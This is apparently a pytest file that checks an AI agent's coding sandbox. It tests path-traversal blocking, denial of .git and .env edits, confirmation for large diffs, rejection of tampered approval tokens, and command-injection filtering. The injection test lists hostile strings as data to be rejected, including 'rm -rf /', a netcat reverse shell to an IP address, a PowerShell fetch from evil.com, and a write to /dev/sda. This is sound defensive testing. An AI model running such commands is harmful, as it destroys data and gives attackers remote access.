"""Adversarial Security & Hostile Sandbox Boundary Tests for Phase 5."""

from pathlib import Path

import pytest

from packages.contracts.security import PolicyVerdict
from packages.contracts.tools import RiskClass
from services.agent_runtime.policy_gate import AgentPolicyGate
from services.coding.serena_bridge import SerenaBridge
from services.coding.test_runner import IsolatedTestRunner
from services.coding.tools import ApplyCodePatchTool


def test_sandbox_path_traversal_blocked(tmp_path: Path) -> None:
    bridge = SerenaBridge(workspace_root=tmp_path)

    # 1. Traversal using ..
    res = bridge.apply_patch("../outside.py", "print('hacked')")
    assert res.success is False
    assert "escapes workspace sandbox" in (res.error or "")

    # 2. Windows absolute path outside sandbox
    res_abs = bridge.apply_patch("C:\\Windows\\System32\\drivers\\etc\\hosts", "print('hacked')")
    assert res_abs.success is False
    assert "escapes workspace sandbox" in (res_abs.error or "")


def test_policy_gate_blocks_sensitive_files(tmp_path: Path) -> None:
    bridge = SerenaBridge(workspace_root=tmp_path)
    tool = ApplyCodePatchTool(bridge=bridge)
    gate = AgentPolicyGate()

    # Attempt to patch .git or .env file
    decision, _ = gate.evaluate(
        tool_spec=tool.spec,
        arguments={"file_path": ".git/config", "new_content": "[core]"},
        task_id="task_1",
        session_id="session_1",
        user_id="user_1",
    )

    assert decision.verdict == PolicyVerdict.DENY
    assert "Path traversal or unauthorized path" in (decision.reason or "")

    # Attempt with .env
    decision_env, _ = gate.evaluate(
        tool_spec=tool.spec,
        arguments={"file_path": ".env", "new_content": "API_KEY=leak"},
        task_id="task_1",
        session_id="session_1",
        user_id="user_1",
    )
    assert decision_env.verdict == PolicyVerdict.DENY


def test_large_diff_requires_user_confirmation(tmp_path: Path) -> None:
    bridge = SerenaBridge(workspace_root=tmp_path)
    tool = ApplyCodePatchTool(bridge=bridge)
    gate = AgentPolicyGate()

    # Generate > 50 lines of code
    large_code = "\n".join([f"var_{i} = {i}" for i in range(60)])

    decision, card = gate.evaluate(
        tool_spec=tool.spec,
        arguments={"file_path": "large_module.py", "new_content": large_code},
        task_id="task_1",
        session_id="session_1",
        user_id="user_1",
        is_user_confirmed=False,
    )

    assert decision.verdict == PolicyVerdict.REQUIRE_USER_CONFIRMATION
    assert decision.risk_class == RiskClass.HIGH_IMPACT
    assert card is not None
    assert "exceeds 50 lines threshold" in decision.reason


def test_replay_and_tampered_approval_tokens_rejected(tmp_path: Path) -> None:
    bridge = SerenaBridge(workspace_root=tmp_path)
    tool = ApplyCodePatchTool(bridge=bridge)
    gate = AgentPolicyGate()

    large_code = "\n".join([f"x_{i} = {i}" for i in range(60)])
    args = {"file_path": "module.py", "new_content": large_code}

    decision, card = gate.evaluate(
        tool_spec=tool.spec,
        arguments=args,
        task_id="task_1",
        session_id="session_1",
        user_id="user_1",
    )
    assert card is not None
    valid_token = card.confirmation_token

    # 1. Tampering with task_id
    tampered_decision, _ = gate.evaluate(
        tool_spec=tool.spec,
        arguments=args,
        task_id="task_ATTACKER",
        session_id="session_1",
        user_id="user_1",
        confirmation_token=valid_token,
        is_user_confirmed=True,
    )
    assert tampered_decision.verdict == PolicyVerdict.DENY

    # 2. Tampering with arguments payload (modifying new_content)
    tampered_args = {
        "file_path": "module.py",
        "new_content": large_code + "\n# Malicious injected payload",
    }
    tampered_args_decision, _ = gate.evaluate(
        tool_spec=tool.spec,
        arguments=tampered_args,
        task_id="task_1",
        session_id="session_1",
        user_id="user_1",
        confirmation_token=valid_token,
        is_user_confirmed=True,
    )
    assert tampered_args_decision.verdict == PolicyVerdict.DENY


def test_test_runner_command_injection_blocked(tmp_path: Path) -> None:
    runner = IsolatedTestRunner(workspace_root=tmp_path)
    malicious_targets = [
        "tests/test_a.py; rm -rf /",
        "tests/test_a.py && nc -e /bin/sh 1.2.3.4 8080",
        "tests/test_a.py | powershell -Command 'Invoke-WebRequest evil.com'",
        "tests/test_a.py`touch /tmp/pwned`",
        "tests/test_a.py > /dev/sda",
        "tests/test_a.py\nmalicious_cmd",
    ]

    for target in malicious_targets:
        with pytest.raises(ValueError, match="Security violation: Illegal characters"):
            runner.run_tests(test_paths=[target])
